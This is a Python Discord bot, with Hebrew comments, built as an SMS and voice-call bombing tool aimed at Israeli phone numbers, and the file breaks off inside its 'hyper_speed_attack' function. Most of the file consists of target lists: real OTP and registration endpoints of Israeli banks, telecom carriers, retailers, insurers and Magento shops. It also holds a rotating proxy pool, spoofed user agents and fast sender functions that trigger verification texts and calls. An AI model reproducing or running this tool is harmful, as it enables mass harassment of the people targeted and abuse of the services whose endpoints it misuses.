import discord
from discord.ext import commands
from discord import app_commands, ui
import asyncio
import aiohttp
import random
import os
import sys
from motor.motor_asyncio import AsyncIOMotorClient
from datetime import datetime, timedelta
import logging
import json
import itertools
import time
import ssl
import certifi
from collections import deque
import urllib.parse

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

MONGO_URI = os.getenv("MONGO_URI")
TOKEN = os.getenv("DISCORD_TOKEN")

if not MONGO_URI or not TOKEN:
    logging.error("❌ Missing environment variables!")
    sys.exit(1)

# התחברות ל-MongoDB
try:
    cluster = AsyncIOMotorClient(MONGO_URI)
    db = cluster["cyberbot"]
    users_col = db["users"]
    logging.info("✅ Connected to MongoDB on Railway")
except Exception as e:
    logging.error(f"❌ Failed to connect to MongoDB: {e}")
    sys.exit(1)

class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix='!', intents=intents)
        self.start_time = datetime.now()
        self.active_attacks = {}
        self.proxy_manager = ProxyManager()
    
    async def setup_hook(self):
        await self.tree.sync()
        logging.info(f"🔱 OMNI-TOTAL-WAR BOT IS ONLINE - MASSIVE EDITION")

bot = CyberBot()

# ========== PROXY MANAGER - מחליף פרוקסי אוטומטית ==========
class ProxyManager:
    def __init__(self):
        self.proxies = self._load_proxies()
        self.proxy_cycle = itertools.cycle(self.proxies)
        self.failed_proxies = set()
        self.proxy_stats = {p: {"success": 0, "fail": 0} for p in self.proxies}
        self.current_proxy = None
        self.lock = asyncio.Lock()
    
    def _load_proxies(self):
        """טעינת פרוקסים - הרבה פרוקסים ישראליים"""
        return [
            # פרוקסים ישראליים
            "http://185.162.230.100:80", "http://185.162.230.102:80", "http://185.162.230.104:80",
            "http://185.162.230.106:80", "http://185.162.230.108:80", "http://185.162.230.110:80",
            "http://185.162.230.112:80", "http://185.162.230.114:80", "http://185.162.230.116:80",
            "http://185.162.230.118:80", "http://185.162.230.120:80", "http://185.162.230.122:80",
            "http://185.162.230.124:80", "http://185.162.230.126:80", "http://185.162.230.128:80",
            "http://185.162.230.130:80", "http://185.162.230.132:80", "http://185.162.230.134:80",
            "http://185.162.230.136:80", "http://185.162.230.138:80", "http://185.162.230.140:80",
            "http://185.162.230.142:80", "http://185.162.230.144:80", "http://185.162.230.146:80",
            "http://185.162.230.148:80", "http://185.162.230.150:80", "http://185.162.230.152:80",
            "http://185.162.230.154:80", "http://185.162.230.156:80", "http://185.162.230.158:80",
            "http://185.162.230.160:80", "http://185.162.230.162:80", "http://185.162.230.164:80",
            "http://185.162.230.166:80", "http://185.162.230.168:80", "http://185.162.230.170:80",
            "http://185.162.230.172:80", "http://185.162.230.174:80", "http://185.162.230.176:80",
            "http://185.162.230.178:80", "http://185.162.230.180:80", "http://185.162.230.182:80",
            "http://185.162.230.184:80", "http://185.162.230.186:80", "http://185.162.230.188:80",
            "http://185.162.230.190:80", "http://185.162.230.192:80", "http://185.162.230.194:80",
            "http://185.162.230.196:80", "http://185.162.230.198:80", "http://185.162.230.200:80",
            "http://185.162.231.100:80", "http://185.162.231.102:80", "http://185.162.231.104:80",
            "http://185.162.231.106:80", "http://185.162.231.108:80", "http://185.162.231.110:80",
            "http://185.162.231.112:80", "http://185.162.231.114:80", "http://185.162.231.116:80",
            "http://185.162.231.118:80", "http://185.162.231.120:80", "http://185.162.231.122:80",
            "http://185.162.231.124:80", "http://185.162.231.126:80", "http://185.162.231.128:80",
            "http://185.162.231.130:80", "http://185.162.231.132:80", "http://185.162.231.134:80",
            "http://185.162.231.136:80", "http://185.162.231.138:80", "http://185.162.231.140:80",
            "http://185.162.231.142:80", "http://185.162.231.144:80", "http://185.162.231.146:80",
            "http://185.162.231.148:80", "http://185.162.231.150:80", "http://185.162.231.152:80",
            "http://185.162.231.154:80", "http://185.162.231.156:80", "http://185.162.231.158:80",
            "http://185.162.231.160:80", "http://185.162.231.162:80", "http://185.162.231.164:80",
            "http://185.162.231.166:80", "http://185.162.231.168:80", "http://185.162.231.170:80",
            "http://185.162.231.172:80", "http://185.162.231.174:80", "http://185.162.231.176:80",
            "http://185.162.231.178:80", "http://185.162.231.180:80", "http://185.162.231.182:80",
            "http://185.162.231.184:80", "http://185.162.231.186:80", "http://185.162.231.188:80",
            "http://185.162.231.190:80", "http://185.162.231.192:80", "http://185.162.231.194:80",
            "http://185.162.231.196:80", "http://185.162.231.198:80", "http://185.162.231.200:80",
            "http://185.162.231.202:80", "http://185.162.231.204:80", "http://185.162.231.206:80",
            "http://185.162.231.208:80", "http://185.162.231.210:80", "http://185.162.231.212:80",
            "http://185.162.231.214:80", "http://185.162.231.216:80", "http://185.162.231.218:80",
            "http://185.162.231.220:80", "http://185.162.231.222:80", "http://185.162.231.224:80",
            "http://185.162.231.226:80", "http://185.162.231.228:80", "http://185.162.231.230:80",
            "http://185.162.231.232:80", "http://185.162.231.234:80", "http://185.162.231.236:80",
            "http://185.162.231.238:80", "http://185.162.231.240:80", "http://185.162.231.242:80",
            "http://185.162.231.244:80", "http://185.162.231.246:80", "http://185.162.231.248:80",
            "http://185.162.231.250:80", "http://103.153.39.26:80", "http://103.153.39.58:80",
            "http://103.153.39.90:80", "http://103.153.39.122:80", "http://103.153.39.154:80",
            "http://103.153.39.186:80", "http://103.153.39.218:80", "http://103.153.39.250:80",
            # פרוקסים נוספים
            "http://51.79.172.203:3128", "http://51.79.173.62:3128", "http://51.79.173.144:3128",
            "http://51.79.50.71:9300", "http://51.79.50.29:9300", "http://51.79.50.114:9300",
            "http://128.199.188.61:3128", "http://128.199.188.62:3128", "http://128.199.188.63:3128",
            "http://167.99.172.167:3128", "http://167.99.172.168:3128", "http://167.99.172.169:3128",
            "http://159.65.230.46:8888", "http://159.65.230.47:8888", "http://159.65.230.48:8888",
            "http://165.227.207.126:3128", "http://165.227.207.127:3128", "http://165.227.207.128:3128"
        ]
    
    async def get_proxy(self):
        """מחזיר פרוקסי שעובד"""
        async with self.lock:
            if self.current_proxy and self.proxy_stats[self.current_proxy]["fail"] < 3:
                return self.current_proxy
            
            # ננסה למצוא פרוקסי עם הכי הרבה הצלחות
            best_proxy = None
            best_ratio = -1
            
            for proxy, stats in self.proxy_stats.items():
                total = stats["success"] + stats["fail"]
                if total > 0:
                    ratio = stats["success"] / total
                    if ratio > best_ratio and stats["fail"] < 5:
                        best_ratio = ratio
                        best_proxy = proxy
            
            if best_proxy:
                self.current_proxy = best_proxy
                return best_proxy
            
            # אם אין, ניקח פרוקסי אקראי שלא נכשל הרבה
            available = [p for p in self.proxies if self.proxy_stats[p]["fail"] < 10]
            if available:
                self.current_proxy = random.choice(available)
                return self.current_proxy
            
            # אם הכל נכשל, נאפס סטטיסטיקות
            self.proxy_stats = {p: {"success": 0, "fail": 0} for p in self.proxies}
            self.current_proxy = random.choice(self.proxies)
            return self.current_proxy
    
    async def report_success(self, proxy):
        async with self.lock:
            if proxy in self.proxy_stats:
                self.proxy_stats[proxy]["success"] += 1
    
    async def report_failure(self, proxy):
        async with self.lock:
            if proxy in self.proxy_stats:
                self.proxy_stats[proxy]["fail"] += 1

# ========== APIs ישראלים ענק - SMS + VOICE ==========
SMS_APIS = [
    # ===== תקשורת וסלולר (15) =====
    {"name": "Cellcom_SMS", "url": "https://www.cellcom.co.il/api/auth/sms", "method": "POST", 
     "headers": {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"},
     "data": {"phone": "PHONE"}},
    {"name": "Partner_SMS", "url": "https://www.partner.co.il/api/register", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Pelephone_SMS", "url": "https://www.pelephone.co.il/api/auth", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Hot_SMS", "url": "https://www.hotmobile.co.il/api/verify", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "019_SMS", "url": "https://019sms.co.il/api/register", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "012_SMS", "url": "https://www.012.net.il/api/sms", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Bezeq_SMS", "url": "https://www.bezeq.co.il/api/auth", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "HOT_Telecom", "url": "https://www.hot.net.il/api/auth/sms", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Cellcom_fiber", "url": "https://www.cellcom.co.il/api/fiber/auth", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Partner_fiber", "url": "https://www.partner.co.il/api/fiber/otp", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Pelephone_fiber", "url": "https://www.pelephone.co.il/api/fiber/sms", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "019_mobile", "url": "https://019mobile.co.il/api/auth/sms", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Rami_Levi_Telecom", "url": "https://www.rami-levy-telecom.co.il/api/otp", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "HOT_mobile", "url": "https://www.hotmobile.co.il/api/auth/sms", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Golan_Telecom", "url": "https://www.golantelecom.co.il/api/auth/sms", "method": "POST",
     "data": {"phone": "PHONE"}},
    
    # ===== בנקים (15) =====
    {"name": "Hapoalim_SMS", "url": "https://login.bankhapoalim.co.il/api/otp/send", "method": "POST",
     "data": {"phone": "PHONE", "sendSMS": True}},
    {"name": "Leumi_SMS", "url": "https://api.leumi.co.il/api/otp/send", "method": "POST",
     "data": {"phone": "PHONE", "channel": "sms"}},
    {"name": "Discount_SMS", "url": "https://api.discountbank.co.il/auth/otp", "method": "POST",
     "data": {"phone": "PHONE_RAW", "method": "sms"}},
    {"name": "Mizrahi_SMS", "url": "https://api.mizrahi-tefahot.co.il/auth/otp", "method": "POST",
     "data": {"phone": "PHONE", "type": "sms"}},
    {"name": "Beinleumi_SMS", "url": "https://api.beinleumi.co.il/auth/send-otp", "method": "POST",
     "data": {"phone": "PHONE", "channel": "sms"}},
    {"name": "Union_SMS", "url": "https://api.unionbank.co.il/auth/otp/sms", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Jerusalem_SMS", "url": "https://api.bank-jerusalem.co.il/auth/otp", "method": "POST",
     "data": {"phone": "PHONE", "sms": True}},
    {"name": "Massad_SMS", "url": "https://api.massad.co.il/auth/otp/sms", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Yahav_SMS", "url": "https://api.yahav.co.il/auth/otp/sms", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Otsar_Hahayal_SMS", "url": "https://api.otsar.org.il/auth/otp/sms", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Postal_Bank", "url": "https://www.israelpost.co.il/api/auth/sms", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Mercantile", "url": "https://www.mercantile.co.il/api/auth/otp", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "U_Bank", "url": "https://www.ubank.co.il/api/auth/sms", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "One_Zero", "url": "https://api.one-zero.com/api/auth/otp", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Pepper", "url": "https://api.pepper.co.il/api/auth/sms", "method": "POST",
     "data": {"phone": "PHONE"}},
    
    # ===== סופרים וקניות (15) =====
    {"name": "Shufersal_SMS", "url": "https://www.shufersal.co.il/api/v1/auth/otp", "method": "POST",
     "data": {"phone": "PHONE_RAW"}},
    {"name": "Rami_Levi_SMS", "url": "https://www.rami-levy.co.il/api/auth/sms", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Victory_SMS", "url": "https://www.victory.co.il/api/auth/otp", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Super_Pharm_SMS", "url": "https://www.super-pharm.co.il/api/sms", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Good_Pharm", "url": "https://www.goodpharm.co.il/api/auth/sms", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Be_SMS", "url": "https://www.be.co.il/api/auth/sms", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Ivory_SMS", "url": "https://www.ivory.co.il/api/auth/sms", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Zap_SMS", "url": "https://www.zap.co.il/api/auth/sms", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Yad2_SMS", "url": "https://www.yad2.co.il/api/auth/register", "method": "POST",
     "data": {"phone": "PHONE", "action": "send_sms"}},
    {"name": "10bis_SMS", "url": "https://www.10bis.co.il/api/register", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Wolt_SMS", "url": "https://www.wolt.com/api/v1/verify", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Dominos_SMS", "url": "https://www.dominos.co.il/api/auth/sms", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "McDonalds_SMS", "url": "https://www.mcdonalds.co.il/api/verify", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "BurgerKing_SMS", "url": "https://www.burgerking.co.il/api/auth", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "KFC_SMS", "url": "https://www.kfc.co.il/api/sms", "method": "POST",
     "data": {"phone": "PHONE"}},
    
    # ===== שירותים (15) =====
    {"name": "Pango_SMS", "url": "https://api.pango.co.il/auth/otp", "method": "POST",
     "data": {"phoneNumber": "PHONE_RAW"}},
    {"name": "Gett_SMS", "url": "https://www.gett.com/il/api/verify", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Hopon_SMS", "url": "https://api.hopon.co.il/v0.15/1/isr/users", "method": "POST",
     "data": {"clientKey": "11687CA9-2165-43F5-96FA-9277A03ABA9E", "phone": "PHONE", "phoneCall": False}},
    {"name": "Moovit_SMS", "url": "https://moovit.com/api/auth/sms", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Hamal_SMS", "url": "https://users-auth.hamal.co.il/auth/send-auth-code", "method": "POST",
     "data": {"value": "PHONE", "type": "phone", "projectId": "1"}},
    {"name": "Mishloha_SMS", "url": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", "method": "POST",
     "data": {"phoneNumber": "PHONE"}},
    {"name": "BurgerAnch_SMS", "url": "https://app.burgeranch.co.il/_a/aff_otp_auth", "method": "POST",
     "data": "phone=PHONE", "type": "form"},
    {"name": "Agva_SMS", "url": "https://www.agva.co.il/api/auth/sms", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Clal_Insurance_SMS", "url": "https://api.clalbit.co.il/auth/otp/sms", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Harel_SMS", "url": "https://api.harel-group.co.il/auth/sms", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Menora_SMS", "url": "https://api.menora.co.il/auth/otp/sms", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Phoenix_SMS", "url": "https://api.phoenix.co.il/auth/sms", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Migdal_SMS", "url": "https://api.migdal.co.il/auth/otp/sms", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Isracard_SMS", "url": "https://www.isracard.co.il/api/auth/sms", "method": "POST",
     "data": {"phone": "PHONE"}},
    {"name": "Max_SMS", "url": "https://www.max.co.il/api/auth/otp", "method": "POST",
     "data": {"phone": "PHONE"}},
]

VOICE_APIS = [
    # ===== בנקים - שיחות (12) =====
    {"name": "Hapoalim_Voice", "url": "https://login.bankhapoalim.co.il/api/otp/send", "method": "POST",
     "data": {"phone": "PHONE", "sendVoice": True}, "has_voice": True},
    {"name": "Leumi_Voice", "url": "https://api.leumi.co.il/api/otp/send", "method": "POST",
     "data": {"phone": "PHONE", "channel": "voice"}, "has_voice": True},
    {"name": "Discount_Voice", "url": "https://api.discountbank.co.il/auth/otp", "method": "POST",
     "data": {"phone": "PHONE_RAW", "method": "voice"}, "has_voice": True},
    {"name": "Mizrahi_Voice", "url": "https://api.mizrahi-tefahot.co.il/auth/otp", "method": "POST",
     "data": {"phone": "PHONE", "type": "voice"}, "has_voice": True},
    {"name": "Beinleumi_Voice", "url": "https://api.beinleumi.co.il/auth/send-otp", "method": "POST",
     "data": {"phone": "PHONE", "channel": "voice"}, "has_voice": True},
    {"name": "Union_Voice", "url": "https://api.unionbank.co.il/auth/otp/voice", "method": "POST",
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Jerusalem_Voice", "url": "https://api.bank-jerusalem.co.il/auth/otp", "method": "POST",
     "data": {"phone": "PHONE", "voice": True}, "has_voice": True},
    {"name": "Massad_Voice", "url": "https://api.massad.co.il/auth/otp/voice", "method": "POST",
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Yahav_Voice", "url": "https://api.yahav.co.il/auth/otp/voice", "method": "POST",
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Otsar_Voice", "url": "https://api.otsar.org.il/auth/otp/voice", "method": "POST",
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Postal_Voice", "url": "https://www.israelpost.co.il/api/auth/voice", "method": "POST",
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "OneZero_Voice", "url": "https://api.one-zero.com/api/auth/voice", "method": "POST",
     "data": {"phone": "PHONE"}, "has_voice": True},
    
    # ===== תקשורת - שיחות (10) =====
    {"name": "Cellcom_Voice", "url": "https://www.cellcom.co.il/api/auth/voice", "method": "POST",
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Partner_Voice", "url": "https://www.partner.co.il/api/auth/voice", "method": "POST",
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Pelephone_Voice", "url": "https://www.pelephone.co.il/api/auth/voice", "method": "POST",
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Hot_Voice", "url": "https://www.hotmobile.co.il/api/auth/voice", "method": "POST",
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "019_Voice", "url": "https://019sms.co.il/api/auth/voice", "method": "POST",
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "012_Voice", "url": "https://www.012.net.il/api/auth/voice", "method": "POST",
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Bezeq_Voice", "url": "https://www.bezeq.co.il/api/auth/voice", "method": "POST",
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "HOT_Telecom_Voice", "url": "https://www.hot.net.il/api/auth/voice", "method": "POST",
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Golan_Voice", "url": "https://www.golantelecom.co.il/api/auth/voice", "method": "POST",
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Rami_Levi_Telecom_Voice", "url": "https://www.rami-levy-telecom.co.il/api/otp/voice", "method": "POST",
     "data": {"phone": "PHONE"}, "has_voice": True},
    
    # ===== קניות ושירותים - שיחות (8) =====
    {"name": "Shufersal_Voice", "url": "https://www.shufersal.co.il/api/v1/auth/voice", "method": "POST",
     "data": {"phone": "PHONE_RAW"}, "has_voice": True},
    {"name": "Rami_Levi_Voice", "url": "https://www.rami-levy.co.il/api/auth/voice", "method": "POST",
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Pango_Voice", "url": "https://api.pango.co.il/auth/voice", "method": "POST",
     "data": {"phoneNumber": "PHONE_RAW"}, "has_voice": True},
    {"name": "Gett_Voice", "url": "https://www.gett.com/il/api/voice", "method": "POST",
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Hopon_Voice", "url": "https://api.hopon.co.il/v0.15/1/isr/users/voice", "method": "POST",
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Clal_Voice", "url": "https://api.clalbit.co.il/auth/otp/voice", "method": "POST",
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Harel_Voice", "url": "https://api.harel-group.co.il/auth/voice", "method": "POST",
     "data": {"phone": "PHONE"}, "has_voice": True},
    {"name": "Isracard_Voice", "url": "https://www.isracard.co.il/api/auth/voice", "method": "POST",
     "data": {"phone": "PHONE"}, "has_voice": True},
]

MAGENTO_APIS = [
    {"name": "Castro", "url": "https://www.castro.com/customer/ajax/post/", "type": "magento"},
    {"name": "Hoodies", "url": "https://www.hoodies.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Urbanica", "url": "https://www.urbanica-wh.com/customer/ajax/post/", "type": "magento"},
    {"name": "CrazyLine", "url": "https://www.crazyline.com/customer/ajax/post/", "type": "magento"},
    {"name": "Onot", "url": "https://www.onot.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Timberland", "url": "https://www.timberland.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "AdikaStyle", "url": "https://www.adikastyle.com/customer/ajax/post/", "type": "magento"},
    {"name": "Weshoes", "url": "https://www.weshoes.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "NineWest", "url": "https://www.ninewest.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Fix", "url": "https://www.fixunderwear.com/customer/ajax/post/", "type": "magento"},
    {"name": "Intima", "url": "https://www.intima-il.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Gali", "url": "https://www.gali.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Golf", "url": "https://www.golf-il.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "KiwiKids", "url": "https://www.kiwi-kids.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Delta", "url": "https://www.delta.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Story", "url": "https://www.storyonline.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Nautica", "url": "https://www.nautica.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "LeeCooper", "url": "https://www.lee-cooper.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "ShoesMarket", "url": "https://www.shoesmarket.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Tamman", "url": "https://www.tamman.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "ModaChild", "url": "https://www.moda-child.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Yangogo", "url": "https://www.yangogo.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Kapara", "url": "https://www.kapara.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "BellaBaby", "url": "https://www.bellababy.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Pashosh", "url": "https://www.pashosh.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Sportwear", "url": "https://www.sportwear.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Running", "url": "https://www.running.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "UrbanPlace", "url": "https://www.urbanplace.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "AmericanVintage", "url": "https://www.american-vintage.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Lacoste", "url": "https://www.lacoste.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Tommy", "url": "https://www.tommyhilfiger.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "CalvinKlein", "url": "https://www.calvinklein.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "UnderArmour", "url": "https://www.underarmour.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Skechers", "url": "https://www.skechers.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Columbia", "url": "https://www.columbia.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Merrell", "url": "https://www.merrell.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Nike", "url": "https://www.nike.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Adidas", "url": "https://www.adidas.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Puma", "url": "https://www.puma.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "NewBalance", "url": "https://www.newbalance.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Converse", "url": "https://www.converse.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Vans", "url": "https://www.vans.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Asics", "url": "https://www.asics.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Reebok", "url": "https://www.reebok.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Musings", "url": "https://www.musings.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Buyme", "url": "https://www.buyme.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Accessorize", "url": "https://www.accessorize.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Mango", "url": "https://www.mango.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Zara", "url": "https://www.zara.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "HM", "url": "https://www.hm.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Bershka", "url": "https://www.bershka.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "PullBear", "url": "https://www.pullandbear.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Stradivarius", "url": "https://www.stradivarius.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Oysho", "url": "https://www.oysho.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "MassimoDutti", "url": "https://www.massimodutti.co.il/customer/ajax/post/", "type": "magento"},
]

# שילוב הכל
ALL_APIS = MAGENTO_APIS + SMS_APIS + VOICE_APIS
TOTAL_APIS = len(ALL_APIS)
SMS_COUNT = len(SMS_APIS)
VOICE_COUNT = len(VOICE_APIS)
MAGENTO_COUNT = len(MAGENTO_APIS)

logging.info(f"📊 Loaded {TOTAL_APIS} APIs ({MAGENTO_COUNT} Magento, {SMS_COUNT} SMS, {VOICE_COUNT} Voice)")

# ========== פונקציות שליחה מהירות במיוחד ==========
async def send_magento_fast(session, url, phone_raw, proxy):
    """שליחת מג'נטו מהירה"""
    data = {
        "type": "login",
        "telephone": phone_raw,
        "bot_validation": 1
    }
    
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
        "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache"
    }
    
    try:
        async with session.post(url, data=data, headers=headers, proxy=proxy, timeout=2) as resp:
            return resp.status in [200, 201, 202]
    except:
        return False

async def send_api_fast(session, api, phone, phone_raw, proxy):
    """שליחת API מהירה"""
    try:
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json",
            "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache"
        }
        
        if api.get("type") == "form":
            url = api["url"]
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            data = api["data"].replace("PHONE", phone)
            async with session.post(url, data=data, headers=headers, proxy=proxy, timeout=2) as resp:
                return resp.status in [200, 201, 202, 204]
        
        elif api.get("type") == "magento":
            return await send_magento_fast(session, api["url"], phone_raw, proxy)
        
        else:  # json
            url = api["url"]
            headers["Content-Type"] = "application/json"
            data_str = json.dumps(api["data"])
            data_str = data_str.replace("PHONE", phone)
            data_str = data_str.replace("PHONE_RAW", phone_raw)
            data = json.loads(data_str)
            async with session.post(url, json=data, headers=headers, proxy=proxy, timeout=2) as resp:
                return resp.status in [200, 201, 202, 204]
    except:
        return False

# ========== User Agents מתחלפים ==========
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
]

# ========== מתקפת מהירות על ==========
async def hyper_speed_attack(phone, duration_mins, attack_type, user_id, interaction, attack_id):
    """מתקפה במהירות היפר-אווירית"""
    phone_raw = phone[3:] if phone.startswith("972") else phone[1:]
    
    end_time = datetime.now() + timedelta(minutes=duration_mins)
    total_sent = 0
    rounds = 0
    
    # בחירת APIs לפי סוג
    if attack_type == "magento":
        apis = MAGENTO_APIS
        api_name = "מג'נטו"
    elif attack_type == "sms":
